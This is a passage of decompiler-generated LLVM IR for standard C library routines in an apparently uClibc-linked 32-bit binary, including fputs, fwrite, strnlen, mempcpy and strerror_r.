  %v1_804ea74 = add i32 %v4_804ea70, 16
  %v2_804ea74 = inttoptr i32 %v1_804ea74 to i32*
  %v3_804ea74 = load i32, i32* %v2_804ea74, align 4
  %v2_804ea77 = add i32 %v4_804ea70, 24
  %v3_804ea77 = inttoptr i32 %v2_804ea77 to i32*
  %v4_804ea77 = load i32, i32* %v3_804ea77, align 4
  %v10_804ea77 = icmp ult i32 %v3_804ea74, %v4_804ea77
  br i1 %v10_804ea77, label %dec_label_pc_804eb19, label %dec_label_pc_804ea80

dec_label_pc_804ea80:                             ; preds = %entry
  %v2_804ea80 = load i16, i16* %tmp, align 2
  %v3_804ea80 = zext i16 %v2_804ea80 to i32
  %v1_804ea83 = and i32 %v3_804ea80, 131
  %v6_804ea8d = icmp ugt i32 %v1_804ea83, 128
  br i1 %v6_804ea8d, label %dec_label_pc_804eaa7, label %dec_label_pc_804ea8f

dec_label_pc_804ea8f:                             ; preds = %dec_label_pc_804ea80
  %v0_804ea8f = load i32, i32* @edx, align 4
  %v6_804ea97 = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_804ea8f, i32 %v0_804ea8f)
  %v1_804ea9f = icmp eq i32 %v6_804ea97, 0
  %v1_804eaa1 = icmp eq i1 %v1_804ea9f, false
  br i1 %v1_804eaa1, label %dec_label_pc_804eb3e, label %dec_label_pc_804ea8f.dec_label_pc_804eaa7_crit_edge

dec_label_pc_804ea8f.dec_label_pc_804eaa7_crit_edge: ; preds = %dec_label_pc_804ea8f
  %v0_804eaa7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804eaa7

dec_label_pc_804eaa7:                             ; preds = %dec_label_pc_804ea8f.dec_label_pc_804eaa7_crit_edge, %dec_label_pc_804ea80
  %v2_804eadb = phi i32 [ %v0_804eaa7.pre, %dec_label_pc_804ea8f.dec_label_pc_804eaa7_crit_edge ], [ %v4_804ea70, %dec_label_pc_804ea80 ]
  %v1_804eaa7 = inttoptr i32 %v2_804eadb to i32*
  %v2_804eaa7 = load i32, i32* %v1_804eaa7, align 4
  store i32 %v2_804eaa7, i32* @ecx, align 4
  %v1_804eaa9 = urem i32 %v2_804eaa7, 65536
  store i32 %v1_804eaa9, i32* %edx.global-to-local, align 4
  %v2_804eaac = and i32 %v2_804eaa7, 2
  %v3_804eaac = icmp eq i32 %v2_804eaac, 0
  br i1 %v3_804eaac, label %dec_label_pc_804eaca, label %dec_label_pc_804eab1

dec_label_pc_804eab1:                             ; preds = %dec_label_pc_804eaa7
  %v1_804eab1 = urem i32 %v2_804eaa7, 2
  store i32 %v1_804eab1, i32* %edx.global-to-local, align 4
  %v1_804eab4 = add i32 %v2_804eaa7, 65535
  %v1_804eab7 = trunc i32 %v1_804eab4 to i16
  %v3_804eab7 = inttoptr i32 %v2_804eadb to i16*
  store i16 %v1_804eab7, i16* %v3_804eab7, align 2
  %v0_804eaba = load i32, i32* @ebx, align 4
  %v1_804eaba = load i32, i32* %edx.global-to-local, align 4
  %v2_804eaba = mul i32 %v1_804eaba, 4
  %v3_804eaba = add i32 %v0_804eaba, 36
  %v4_804eaba = add i32 %v3_804eaba, %v2_804eaba
  %v5_804eaba = inttoptr i32 %v4_804eaba to i8*
  %v6_804eaba = load i8, i8* %v5_804eaba, align 1
  %v7_804eaba = zext i8 %v6_804eaba to i32
  %v9_804eaba = and i32 %v1_804eaba, -256
  %v10_804eaba = or i32 %v7_804eaba, %v9_804eaba
  store i32 %v10_804eaba, i32* %edx.global-to-local, align 4
  %v1_804eabe = add i32 %v0_804eaba, 40
  %v2_804eabe = inttoptr i32 %v1_804eabe to i32*
  store i32 0, i32* %v2_804eabe, align 4
  %v0_804eac5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eac5 = urem i32 %v0_804eac5, 256
  store i32 %v1_804eac5, i32* @edx, align 4
  br label %dec_label_pc_804eb41

dec_label_pc_804eaca:                             ; preds = %dec_label_pc_804eaa7
  %v1_804eaca = add i32 %v2_804eadb, 16
  %v2_804eaca = inttoptr i32 %v1_804eaca to i32*
  %v3_804eaca = load i32, i32* %v2_804eaca, align 4
  store i32 %v3_804eaca, i32* @eax, align 4
  %v1_804eacd = add i32 %v2_804eadb, 20
  %v2_804eacd = inttoptr i32 %v1_804eacd to i32*
  %v3_804eacd = load i32, i32* %v2_804eacd, align 4
  %v15_804eacd = icmp eq i32 %v3_804eacd, %v3_804eaca
  %v1_804ead0 = icmp eq i1 %v15_804eacd, false
  br i1 %v1_804ead0, label %dec_label_pc_804eb19, label %dec_label_pc_804ead2

dec_label_pc_804ead2:                             ; preds = %dec_label_pc_804eaca
  %v1_804ead2 = add i32 %v2_804eadb, 4
  %v2_804ead2 = inttoptr i32 %v1_804ead2 to i32*
  %v3_804ead2 = load i32, i32* %v2_804ead2, align 4
  %v13_804ead2 = icmp eq i32 %v3_804ead2, -2
  %v1_804ead6 = icmp eq i1 %v13_804ead2, false
  br i1 %v1_804ead6, label %dec_label_pc_804eae0, label %dec_label_pc_804ead8

dec_label_pc_804ead8:                             ; preds = %dec_label_pc_804ead2
  %v1_804ead8 = or i32 %v2_804eaa7, 4
  store i32 %v1_804ead8, i32* @ecx, align 4
  %v1_804eadb = trunc i32 %v1_804ead8 to i16
  %v3_804eadb = inttoptr i32 %v2_804eadb to i16*
  store i16 %v1_804eadb, i16* %v3_804eadb, align 2
  br label %dec_label_pc_804eb3e

dec_label_pc_804eae0:                             ; preds = %dec_label_pc_804ead2
  %v1_804eae0 = udiv i32 %v2_804eaa7, 256
  %v2_804eae0 = trunc i32 %v1_804eae0 to i8
  %v3_804eae0 = urem i8 %v2_804eae0, 4
  %v4_804eae0 = icmp eq i8 %v3_804eae0, 0
  %v8_804eae0 = zext i8 %v3_804eae0 to i32
  %v10_804eae0 = mul nuw nsw i32 %v8_804eae0, 256
  %v11_804eae0 = urem i32 %v2_804eaa7, 256
  %v12_804eae0 = or i32 %v10_804eae0, %v11_804eae0
  store i32 %v12_804eae0, i32* %edx.global-to-local, align 4
  br i1 %v4_804eae0, label %dec_label_pc_804eaf5, label %dec_label_pc_804eae5

dec_label_pc_804eae5:                             ; preds = %dec_label_pc_804eae0
  %v3_804eaed = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805218c.104 to i16*))
  %v0_804eaf5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804eaf5

dec_label_pc_804eaf5:                             ; preds = %dec_label_pc_804eae0, %dec_label_pc_804eae5
  %v0_804eb2a = phi i32 [ %v2_804eadb, %dec_label_pc_804eae0 ], [ %v0_804eaf5.pre, %dec_label_pc_804eae5 ]
  %v1_804eaf5 = add i32 %v0_804eb2a, 8
  %v2_804eaf5 = inttoptr i32 %v1_804eaf5 to i32*
  %v3_804eaf5 = load i32, i32* %v2_804eaf5, align 4
  %v1_804eaf8 = add i32 %v0_804eb2a, 12
  %v2_804eaf8 = inttoptr i32 %v1_804eaf8 to i32*
  %v3_804eaf8 = load i32, i32* %v2_804eaf8, align 4
  %v15_804eaf8 = icmp eq i32 %v3_804eaf8, %v3_804eaf5
  br i1 %v15_804eaf8, label %dec_label_pc_804eb22, label %dec_label_pc_804eafd

dec_label_pc_804eafd:                             ; preds = %dec_label_pc_804eaf5
  %v2_804eb00 = add i32 %v0_804eb2a, 24
  %v3_804eb00 = inttoptr i32 %v2_804eb00 to i32*
  store i32 %v3_804eaf5, i32* %v3_804eb00, align 4
  %v0_804eb03 = load i32, i32* @ebx, align 4
  %v2_804eb04 = call i32 @__stdio_rfill(i32 %v0_804eb03)
  %v1_804eb0c = icmp eq i32 %v2_804eb04, 0
  br i1 %v1_804eb0c, label %dec_label_pc_804eb3e, label %dec_label_pc_804eb10

dec_label_pc_804eb10:                             ; preds = %dec_label_pc_804eafd
  %v0_804eb10 = load i32, i32* @ebx, align 4
  %v1_804eb10 = add i32 %v0_804eb10, 20
  %v2_804eb10 = inttoptr i32 %v1_804eb10 to i32*
  %v3_804eb10 = load i32, i32* %v2_804eb10, align 4
  %v2_804eb13 = add i32 %v0_804eb10, 24
  %v3_804eb13 = inttoptr i32 %v2_804eb13 to i32*
  store i32 %v3_804eb10, i32* %v3_804eb13, align 4
  %v0_804eb16 = load i32, i32* @ebx, align 4
  %v1_804eb16 = add i32 %v0_804eb16, 16
  %v2_804eb16 = inttoptr i32 %v1_804eb16 to i32*
  %v3_804eb16 = load i32, i32* %v2_804eb16, align 4
  br label %dec_label_pc_804eb19

dec_label_pc_804eb19:                             ; preds = %dec_label_pc_804eaca, %entry, %dec_label_pc_804eb10
  %v1_804eb1d = phi i32 [ %v2_804eadb, %dec_label_pc_804eaca ], [ %v4_804ea70, %entry ], [ %v0_804eb16, %dec_label_pc_804eb10 ]
  %v0_804eb19 = phi i32 [ %v3_804eaca, %dec_label_pc_804eaca ], [ %v3_804ea74, %entry ], [ %v3_804eb16, %dec_label_pc_804eb10 ]
  %v1_804eb19 = inttoptr i32 %v0_804eb19 to i8*
  %v2_804eb19 = load i8, i8* %v1_804eb19, align 1
  %v3_804eb19 = zext i8 %v2_804eb19 to i32
  store i32 %v3_804eb19, i32* @edx, align 4
  %v1_804eb1c = add i32 %v0_804eb19, 1
  %v2_804eb1d = add i32 %v1_804eb1d, 16
  %v3_804eb1d = inttoptr i32 %v2_804eb1d to i32*
  store i32 %v1_804eb1c, i32* %v3_804eb1d, align 4
  %v0_804eb41.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804eb41

dec_label_pc_804eb22:                             ; preds = %dec_label_pc_804eaf5
  %v2_804eb25 = ptrtoint i8* %stack_var_-5 to i32
  %v5_804eb2a = inttoptr i32 %v0_804eb2a to i16*
  %v5_804eb2b = call i32 @__stdio_READ(i16* %v5_804eb2a, i32 %v2_804eb25, i32 1)
  %v1_804eb33 = icmp eq i32 %v5_804eb2b, 0
  br i1 %v1_804eb33, label %dec_label_pc_804eb3e, label %dec_label_pc_804eb37

dec_label_pc_804eb37:                             ; preds = %dec_label_pc_804eb22
  %v3_804eb37 = load i8, i8* %stack_var_-5, align 1
  %v4_804eb37 = sext i8 %v3_804eb37 to i32
  store i32 %v4_804eb37, i32* @edx, align 4
  br label %dec_label_pc_804eb41

dec_label_pc_804eb3e:                             ; preds = %dec_label_pc_804eb22, %dec_label_pc_804eafd, %dec_label_pc_804ea8f, %dec_label_pc_804ead8
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_804eb41

dec_label_pc_804eb41:                             ; preds = %dec_label_pc_804eb37, %dec_label_pc_804eb19, %dec_label_pc_804eab1, %dec_label_pc_804eb3e
  %v0_804eb41 = phi i32 [ %v4_804eb37, %dec_label_pc_804eb37 ], [ %v0_804eb41.pre, %dec_label_pc_804eb19 ], [ %v1_804eac5, %dec_label_pc_804eab1 ], [ -1, %dec_label_pc_804eb3e ]
  store i32 %v0_804ea6c, i32* @ebx, align 4
  ret i32 %v0_804eb41

; uselistorder directives
  uselistorder i32 %v0_804eb19, { 1, 0 }
  uselistorder i32 %v3_804eaf5, { 1, 0 }
  uselistorder i32 %v0_804eb2a, { 0, 1, 3, 2 }
  uselistorder i8 %v3_804eae0, { 1, 0 }
  uselistorder i32 %v3_804eaca, { 1, 0, 2 }
  uselistorder i32 %v1_804eac5, { 1, 0 }
  uselistorder i32 %v2_804eaa7, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_804eadb, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 36, { 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 1, 2, 19, 3 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_804eb41, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804eb3e, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804eb19, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eaf5, { 1, 0 }
}

define i32 @__GI_fputs_unlocked() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-8 = alloca i32, align 4
  %v0_804eb48 = load i32, i32* @esi, align 4
  %v0_804eb49 = load i32, i32* @ebx, align 4
  store i32 %v0_804eb49, i32* %stack_var_-8, align 4
  %v4_804eb4d = ptrtoint i8* %tmp4 to i32
  store i32 %v4_804eb4d, i32* @ebx, align 4
  %v3_804eb52 = call i32 @strlen(i8* %tmp4)
  store i32 %v3_804eb52, i32* @esi, align 4
  %v0_804eb63 = load i32, i32* @ebx, align 4
  %v6_804eb64 = call i32 @__GI_fwrite_unlocked(i32 %v0_804eb63, i64 1, i32 %v3_804eb52, i32 %tmp)
  %v1_804eb6f = load i32, i32* @esi, align 4
  %v12_804eb6f = icmp eq i32 %v6_804eb64, %v1_804eb6f
  %v1_804eb71 = icmp eq i1 %v12_804eb6f, false
  br i1 %v1_804eb71, label %dec_label_pc_804eb75, label %dec_label_pc_804eb73

dec_label_pc_804eb73:                             ; preds = %entry
  br label %dec_label_pc_804eb75

dec_label_pc_804eb75:                             ; preds = %entry, %dec_label_pc_804eb73
  %v0_804eb75 = phi i32 [ -1, %entry ], [ %v6_804eb64, %dec_label_pc_804eb73 ]
  %v2_804eb78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804eb78, i32* @ebx, align 4
  store i32 %v0_804eb48, i32* @esi, align 4
  ret i32 %v0_804eb75

; uselistorder directives
  uselistorder i32 %v6_804eb64, { 1, 0 }
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder label %dec_label_pc_804eb75, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804eb7c = load i32, i32* @edi, align 4
  %v0_804eb7d = load i32, i32* @esi, align 4
  %v0_804eb7e = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804eb83 = trunc i64 %arg2 to i32
  store i32 %v4_804eb83, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804eb8b = inttoptr i32 %arg4 to i16*
  %v2_804eb8b = load i16, i16* %v1_804eb8b, align 2
  %v1_804eb8e = and i16 %v2_804eb8b, 192
  %v6_804eb93 = icmp eq i16 %v1_804eb8e, 192
  br i1 %v6_804eb93, label %dec_label_pc_804ebae, label %dec_label_pc_804eb9a

dec_label_pc_804eb9a:                             ; preds = %entry
  %v0_804eb9a = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804eba2 = call i32 @__stdio_trans2w_o(i16* %v1_804eb8b, i32 128, i32 %v0_804eb9a, i32 %v0_804eb9a, i32 %v0_804eb7e, i32 %v0_804eb7d, i32 %v0_804eb7c)
  %v1_804ebaa = icmp eq i32 %v9_804eba2, 0
  %v1_804ebac = icmp eq i1 %v1_804ebaa, false
  br i1 %v1_804ebac, label %dec_label_pc_804ebea, label %dec_label_pc_804ebae

dec_label_pc_804ebae:                             ; preds = %dec_label_pc_804eb9a, %entry
  %v2_804ebae = icmp eq i32 %v4_804eb83, 0
  br i1 %v2_804ebae, label %dec_label_pc_804ebea, label %dec_label_pc_804ebb2

dec_label_pc_804ebb2:                             ; preds = %dec_label_pc_804ebae
  %v1_804ebb2 = icmp eq i32 %arg3, 0
  br i1 %v1_804ebb2, label %dec_label_pc_804ebea, label %dec_label_pc_804ebb6

dec_label_pc_804ebb6:                             ; preds = %dec_label_pc_804ebb2
  %v9_804ebbb = udiv i64 4294967295, %arg2
  %v10_804ebbb = trunc i64 %v9_804ebbb to i32
  %v6_804ebbf = icmp ult i32 %v10_804ebbb, %arg3
  br i1 %v6_804ebbf, label %dec_label_pc_804ebdb, label %dec_label_pc_804ebc1

dec_label_pc_804ebc1:                             ; preds = %dec_label_pc_804ebb6
  %sext = mul i64 %arg2, 4294967296
  %v2_804ebc4 = sdiv i64 %sext, 4294967296
  %v3_804ebc4 = sext i32 %arg3 to i64
  %v4_804ebc4 = mul nsw i64 %v3_804ebc4, %v2_804ebc4
  %v5_804ebc4 = trunc i64 %v4_804ebc4 to i32
  %v0_804ebc7 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804ebcd = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804ebc4, i32 %v0_804ebc7, i32 %v10_804ebbb)
  %v6_804ebcd = sext i32 %v5_804ebcd to i64
  %v10_804ebd4 = udiv i64 %v6_804ebcd, %arg2
  %v11_804ebd4 = trunc i64 %v10_804ebd4 to i32
  br label %dec_label_pc_804ebec

dec_label_pc_804ebdb:                             ; preds = %dec_label_pc_804ebb6
  %v0_804ebdb = load i32, i32* @ebx, align 4
  %v1_804ebdb = inttoptr i32 %v0_804ebdb to i16*
  %v2_804ebdb = load i16, i16* %v1_804ebdb, align 2
  %v3_804ebdb = or i16 %v2_804ebdb, 8
  store i16 %v3_804ebdb, i16* %v1_804ebdb, align 2
  %v0_804ebdf = load i32, i32* %stack_var_-28, align 4
  %v1_804ebdf = call i32 @__errno_location(i32 %v0_804ebdf)
  %v1_804ebe4 = inttoptr i32 %v1_804ebdf to i32*
  store i32 22, i32* %v1_804ebe4, align 4
  br label %dec_label_pc_804ebea

dec_label_pc_804ebea:                             ; preds = %dec_label_pc_804ebb2, %dec_label_pc_804ebae, %dec_label_pc_804eb9a, %dec_label_pc_804ebdb
  br label %dec_label_pc_804ebec

dec_label_pc_804ebec:                             ; preds = %dec_label_pc_804ebc1, %dec_label_pc_804ebea
  %v0_804ebef = phi i32 [ %v11_804ebd4, %dec_label_pc_804ebc1 ], [ 0, %dec_label_pc_804ebea ]
  store i32 %v0_804eb7d, i32* @esi, align 4
  store i32 %v0_804eb7c, i32* @edi, align 4
  ret i32 %v0_804ebef

; uselistorder directives
  uselistorder i32 %v0_804eb9a, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 128, { 6, 7, 11, 14, 0, 15, 16, 4, 1, 18, 10, 12, 2, 3, 8, 9, 13, 5, 17 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ebec, { 1, 0 }
  uselistorder label %dec_label_pc_804ebea, { 3, 0, 1, 2 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_3()
  %v4_804ebf0 = ptrtoint i8* %tmp4 to i32
  %v8_804ec035 = icmp eq i32 %tmp, 0
  %v1_804ec046 = icmp eq i1 %v8_804ec035, false
  br i1 %v1_804ec046, label %dec_label_pc_804ebfd, label %dec_label_pc_804ec06

dec_label_pc_804ebfd:                             ; preds = %entry, %dec_label_pc_804ec02
  %v1_804ec038 = phi i32 [ %v1_804ec03, %dec_label_pc_804ec02 ], [ %tmp, %entry ]
  %v0_804ec067 = phi i32 [ %v1_804ec02, %dec_label_pc_804ec02 ], [ %v4_804ebf0, %entry ]
  %v1_804ebfd = inttoptr i32 %v0_804ec067 to i8*
  %v2_804ebfd = load i8, i8* %v1_804ebfd, align 1
  %v3_804ebfd = icmp eq i8 %v2_804ebfd, 0
  br i1 %v3_804ebfd, label %dec_label_pc_804ec06, label %dec_label_pc_804ec02

dec_label_pc_804ec02:                             ; preds = %dec_label_pc_804ebfd
  %v1_804ec02 = add i32 %v0_804ec067, 1
  %v1_804ec03 = add i32 %v1_804ec038, -1
  %v8_804ec03 = icmp eq i32 %v1_804ec03, 0
  %v1_804ec04 = icmp eq i1 %v8_804ec03, false
  br i1 %v1_804ec04, label %dec_label_pc_804ebfd, label %dec_label_pc_804ec06

dec_label_pc_804ec06:                             ; preds = %dec_label_pc_804ec02, %dec_label_pc_804ebfd, %entry
  %v0_804ec06.lcssa = phi i32 [ %v4_804ebf0, %entry ], [ %v0_804ec067, %dec_label_pc_804ebfd ], [ %v1_804ec02, %dec_label_pc_804ec02 ]
  %v2_804ec06 = sub i32 %v0_804ec06.lcssa, %v4_804ebf0
  ret i32 %v2_804ec06

; uselistorder directives
  uselistorder i32 %v1_804ec03, { 1, 0 }
  uselistorder i32 %v0_804ec067, { 0, 2, 1 }
  uselistorder i32 %v4_804ebf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ebfd, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804ec0c = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_804ec1f = inttoptr i32 %arg1 to i16*
  %v4_804ec1f = call i32 @memcpy(i16* %v3_804ec1f, i32 %arg2, i32 %arg3)
  %v0_804ec24 = load i32, i32* @esi, align 4
  %v2_804ec24 = add i32 %v0_804ec24, %arg3
  store i32 %v0_804ec0c, i32* @esi, align 4
  ret i32 %v2_804ec24
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804ec41 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804ec46 = load i32, i32* @ebx, align 4
  ret i32 %v0_804ec46
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804ec62 = icmp ugt i32 %arg1, 124
  br i1 %v6_804ec62, label %dec_label_pc_804ec7f, label %dec_label_pc_804ec64

dec_label_pc_804ec64:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8050a40.124 to i32), i32* @esi, align 4
  %v1_804ec744 = icmp eq i32 %arg1, 0
  %v1_804ec7611 = icmp eq i1 %v1_804ec744, false
  br i1 %v1_804ec7611, label %dec_label_pc_804ec6d, label %dec_label_pc_804ec78

dec_label_pc_804ec6d:                             ; preds = %dec_label_pc_804ec64, %dec_label_pc_804ec6d
  %v0_804ec70 = phi i32 [ %v3_804ec70, %dec_label_pc_804ec6d ], [ %arg1, %dec_label_pc_804ec64 ]
  %v0_804ec73 = phi i32 [ %v1_804ec73, %dec_label_pc_804ec6d ], [ ptrtoint ([8 x i8]* @global_var_8050a40.124 to i32), %dec_label_pc_804ec64 ]
  %v1_804ec6d = inttoptr i32 %v0_804ec73 to i8*
  %v2_804ec6d = load i8, i8* %v1_804ec6d, align 1
  %v7_804ec6d = icmp eq i8 %v2_804ec6d, 0
  %v2_804ec70 = zext i1 %v7_804ec6d to i32
  %v3_804ec70 = add i32 %v2_804ec70, %v0_804ec70
  %v16_804ec70 = icmp eq i32 %v3_804ec70, 0
  %v1_804ec73 = add i32 %v0_804ec73, 1
  store i32 %v1_804ec73, i32* @esi, align 4
  %v1_804ec76 = icmp eq i1 %v16_804ec70, false
  br i1 %v1_804ec76, label %dec_label_pc_804ec6d, label %dec_label_pc_804ec78

dec_label_pc_804ec78:                             ; preds = %dec_label_pc_804ec6d, %dec_label_pc_804ec64
  %v0_804ec7a = phi i32 [ ptrtoint ([8 x i8]* @global_var_8050a40.124 to i32), %dec_label_pc_804ec64 ], [ %v1_804ec73, %dec_label_pc_804ec6d ]
  store i32 0, i32* @ebp, align 4
  %v1_804ec7a = inttoptr i32 %v0_804ec7a to i8*
  %v2_804ec7a = load i8, i8* %v1_804ec7a, align 1
  %v3_804ec7a = icmp eq i8 %v2_804ec7a, 0
  %v1_804ec7d = icmp eq i1 %v3_804ec7a, false
  br i1 %v1_804ec7d, label %dec_label_pc_804ec78.dec_label_pc_804ecae_crit_edge, label %dec_label_pc_804ec7f

dec_label_pc_804ec78.dec_label_pc_804ecae_crit_edge: ; preds = %dec_label_pc_804ec78
  br label %dec_label_pc_804ecae

dec_label_pc_804ec7f:                             ; preds = %dec_label_pc_804ec78, %entry
  store i32 22, i32* @ebp, align 4
  %v1_804ec87 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_804ec93 = bitcast i32* %stack_var_-17 to i8*
  %v7_804ec93 = call i32 @_uintmaxtostr(i8* %v6_804ec93, i32 %arg1, i32 %v1_804ec87, i32 -10, i32 0)
  %v1_804ec9b = add i32 %v7_804ec93, -14
  store i32 %v1_804ec9b, i32* @esi, align 4
  %v5_804eca5 = inttoptr i32 %v1_804ec9b to i8*
  store i8* %v5_804eca5, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804ec9b to i16*
  %v6_804eca6 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8050a1e.125 to i32), i32 14)
  %v0_804ecbd.pre = load i32, i32* @edi, align 4
  %v0_804ecbf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ecae

dec_label_pc_804ecae:                             ; preds = %dec_label_pc_804ec78.dec_label_pc_804ecae_crit_edge, %dec_label_pc_804ec7f
  %v0_804ecbf = phi i32 [ %v0_804ec7a, %dec_label_pc_804ec78.dec_label_pc_804ecae_crit_edge ], [ %v0_804ecbf.pre, %dec_label_pc_804ec7f ]
  %v0_804ecbd = phi i32 [ %arg3, %dec_label_pc_804ec78.dec_label_pc_804ecae_crit_edge ], [ %v0_804ecbd.pre, %dec_label_pc_804ec7f ]
  %v4_804ecb0 = icmp eq i32 %arg2, 0
  %v1_804ecb5 = icmp eq i1 %v4_804ecb0, false
  %v2_804ecbd = select i1 %v1_804ecb5, i32 %v0_804ecbd, i32 0
  store i32 %v2_804ecbd, i32* @edi, align 4
  %v5_804ecbf = inttoptr i32 %v0_804ecbf to i8*
  store i8* %v5_804ecbf, i8** %stack_var_-108, align 4
  %v3_804ecc0 = call i32 @strlen(i8* %v5_804ecbf)
  %v1_804ecc8 = add i32 %v3_804ecc0, 1
  store i32 %v1_804ecc8, i32* %ebx.global-to-local, align 4
  %v1_804eccb = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_804ecc8, %v1_804eccb
  br i1 %tmp46, label %dec_label_pc_804eccf, label %dec_label_pc_804ecd6

dec_label_pc_804eccf:                             ; preds = %dec_label_pc_804ecae
  store i32 %v1_804eccb, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804ecd6

dec_label_pc_804ecd6:                             ; preds = %dec_label_pc_804ecae, %dec_label_pc_804eccf
  %v0_804ecdb = phi i32 [ %v1_804ecc8, %dec_label_pc_804ecae ], [ %v1_804eccb, %dec_label_pc_804eccf ]
  %v1_804ecd6 = icmp eq i32 %v0_804ecdb, 0
  br i1 %v1_804ecd6, label %dec_label_pc_804ecf2, label %dec_label_pc_804ecda

dec_label_pc_804ecda:                             ; preds = %dec_label_pc_804ecd6
  %v0_804ecdc = load i32, i32* @esi, align 4
  %v8_804ecdd = inttoptr i32 %arg2 to i8*
  store i8* %v8_804ecdd, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804ece1 = call i32 @memcpy(i16* %tmp45, i32 %v0_804ecdc, i32 %v0_804ecdb)
  %v1_804eced = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eced = add i32 %arg2, -1
  %v3_804eced = add i32 %v2_804eced, %v1_804eced
  %v4_804eced = inttoptr i32 %v3_804eced to i8*
  store i8 0, i8* %v4_804eced, align 1
  br label %dec_label_pc_804ecf2

dec_label_pc_804ecf2:                             ; preds = %dec_label_pc_804ecd6, %dec_label_pc_804ecda
  %v0_804ecf2 = load i32, i32* @ebp, align 4
  %v1_804ecf2 = icmp eq i32 %v0_804ecf2, 0
  br i1 %v1_804ecf2, label %dec_label_pc_804ecfd, label %dec_label_pc_804ecf6

dec_label_pc_804ecf6:                             ; preds = %dec_label_pc_804ecf2
  %v0_804ecf6 = load i8*, i8** %stack_var_-108, align 4
  %v1_804ecf6 = ptrtoint i8* %v0_804ecf6 to i32
  %v2_804ecf6 = call i32 @__errno_location(i32 %v1_804ecf6)
  %v0_804ecfb = load i32, i32* @ebp, align 4
  %v2_804ecfb = inttoptr i32 %v2_804ecf6 to i32*
  store i32 %v0_804ecfb, i32* %v2_804ecfb, align 4
  %v0_804ed00.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804ecfd

dec_label_pc_804ecfd:                             ; preds = %dec_label_pc_804ecf2, %dec_label_pc_804ecf6
  %v0_804ed00 = phi i32 [ 0, %dec_label_pc_804ecf2 ], [ %v0_804ed00.pre, %dec_label_pc_804ecf6 ]
  ret i32 %v0_804ed00

; uselistorder directives
  uselistorder i32 %v1_804eccb, { 1, 2, 0 }
  uselistorder i32 %v1_804ecc8, { 1, 0, 2 }
  uselistorder i32 %v1_804ec9b, { 1, 0, 2 }
  uselistorder i32 %v1_804ec73, { 0, 2, 1 }
  uselistorder i32 %v3_804ec70, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 34, { 11, 2, 3, 4, 5, 6, 7, 8, 10, 12, 13, 9, 0, 1, 14, 15 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8050a40.124 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
